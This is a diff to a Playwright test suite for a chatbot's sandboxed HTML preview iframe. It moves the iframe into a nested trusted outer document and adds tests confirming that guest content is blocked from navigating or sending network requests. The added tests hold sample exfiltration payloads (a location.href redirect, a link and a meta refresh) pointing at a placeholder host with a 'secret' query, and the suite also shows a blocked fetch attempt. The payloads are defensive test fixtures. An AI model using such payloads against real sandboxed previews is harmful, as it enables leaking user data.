@@ -16,10 +16,10 @@ async function openPreview(
     async ({ content, files }) => {
       const modulePath =
         '/src/app-modules/chatbot/views/chat/artifacts/html-preview-bundle.ts';
-      const policyPath =
-        '/src/app-modules/chatbot/views/chat/artifacts/html-preview-policy.ts';
+      const documentPath =
+        '/src/app-modules/chatbot/views/chat/artifacts/html-preview-document.ts';
       const { bundleHtmlPreview } = await import(modulePath);
-      const { HTML_PREVIEW_CSP } = await import(policyPath);
+      const { htmlPreviewDocument } = await import(documentPath);
       const html = await bundleHtmlPreview(
         content,
         'demo/index.html',
@@ -36,7 +36,16 @@ async function openPreview(
       const frame = document.createElement('iframe');
       frame.title = 'Saved result';
       frame.setAttribute('sandbox', 'allow-scripts');
-      frame.srcdoc = `<meta http-equiv="Content-Security-Policy" content="${HTML_PREVIEW_CSP}">${html}`;
+      const channel = crypto.randomUUID();
+      window.addEventListener('message', (event) => {
+        if (
+          event.source === frame.contentWindow &&
+          event.data?.channel === channel &&
+          event.data?.type === 'preview-error'
+        )
+          document.body.dataset.previewError = 'true';
+      });
+      frame.srcdoc = htmlPreviewDocument(html, channel, 'Saved result');
       document.body.appendChild(frame);
     },
     { content, files },
@@ -58,7 +67,9 @@ test('saved deferred classic scripts retain globals and ordering after document 
         "window.sequence.push('second');document.querySelector('#result').textContent=JSON.stringify({value:sharedValue+1,order:window.sequence});",
     },
   );
-  await expect(page.frameLocator('iframe').locator('#result')).toHaveText(
+  await expect(
+    page.frameLocator('iframe').frameLocator('iframe').locator('#result'),
+  ).toHaveText(
     JSON.stringify({ value: 42, order: ['first', 'module', 'second'] }),
   );
 });
@@ -81,7 +92,7 @@ test('top-level await, cycles and repeated module entries share one module insta
         "import {bump} from './shared.js'; await Promise.resolve(); document.body.dataset.count=String(bump());",
     },
   );
-  const frame = page.frameLocator('iframe');
+  const frame = page.frameLocator('iframe').frameLocator('iframe');
   await expect(frame.locator('#result')).toHaveText(
     JSON.stringify({ value: 1, initializations: 1 }),
   );
@@ -103,9 +114,9 @@ test('embedded scripts cannot access the parent or send network requests', async
     fetch('https://external.invalid/private').catch(()=>document.querySelector('#result').textContent=String(blocked));
     </script></body>`,
   );
-  await expect(page.frameLocator('iframe').locator('#result')).toHaveText(
-    'true',
-  );
+  await expect(
+    page.frameLocator('iframe').frameLocator('iframe').locator('#result'),
+  ).toHaveText('true');
   expect(network).toEqual([]);
   await expect(page.locator('body')).not.toHaveAttribute('data-escaped');
 });
@@ -126,7 +137,10 @@ test('embedded stylesheets retain print and viewport media conditions', async ({
   await page
     .locator('iframe')
     .evaluate((frame) => frame.setAttribute('width', '600'));
-  const result = page.frameLocator('iframe').locator('#result');
+  const result = page
+    .frameLocator('iframe')
+    .frameLocator('iframe')
+    .locator('#result');
   await expect(result).toBeVisible();
   await expect(result).toHaveCSS('color', 'rgb(0, 0, 0)');
   await page
@@ -146,7 +160,10 @@ test('inline style images load from the saved dependency snapshot', async ({
         '<svg xmlns="http://www.w3.org/2000/svg" width="80" height="40"><rect width="80" height="40" fill="green"/></svg>',
     },
   );
-  const result = page.frameLocator('iframe').locator('#result');
+  const result = page
+    .frameLocator('iframe')
+    .frameLocator('iframe')
+    .locator('#result');
   await expect(result).toBeVisible();
   const size = await result.evaluate(async (element) => {
     const background = getComputedStyle(element).backgroundImage;
@@ -175,6 +192,7 @@ test('saved GIF images match the native preview fixture', async ({ page }) => {
   );
   const size = await page
     .frameLocator('iframe')
+    .frameLocator('iframe')
     .locator('#result')
     .evaluate(async (element: HTMLImageElement) => {
       await element.decode();
@@ -182,3 +200,40 @@ test('saved GIF images match the native preview fixture', async ({ page }) => {
     });
   expect(size).toEqual([1, 1]);
 });
+
+for (const [method, content] of [
+  [
+    'location',
+    `<script>location.href='https://external.invalid/leak?secret=synthetic'</script>`,
+  ],
+  [
+    'link',
+    `<a id="leave" href="https://external.invalid/leak?secret=synthetic">Leave</a>`,
+  ],
+  [
+    'refresh',
+    `<meta http-equiv="refresh" content="0;url=https://external.invalid/leak?secret=synthetic">`,
+  ],
+]) {
+  test(`the trusted outer document blocks guest ${method} navigation before a network request`, async ({
+    page,
+  }) => {
+    const network: string[] = [];
+    await page.route('https://external.invalid/**', (route) => {
+      network.push(route.request().url());
+      return route.abort();
+    });
+    await openPreview(page, content);
+    if (method === 'link')
+      await page
+        .frameLocator('iframe')
+        .frameLocator('iframe')
+        .locator('#leave')
+        .click();
+    await expect(page.locator('body')).toHaveAttribute(
+      'data-preview-error',
+      'true',
+    );
+    expect(network).toEqual([]);
+  });
+}
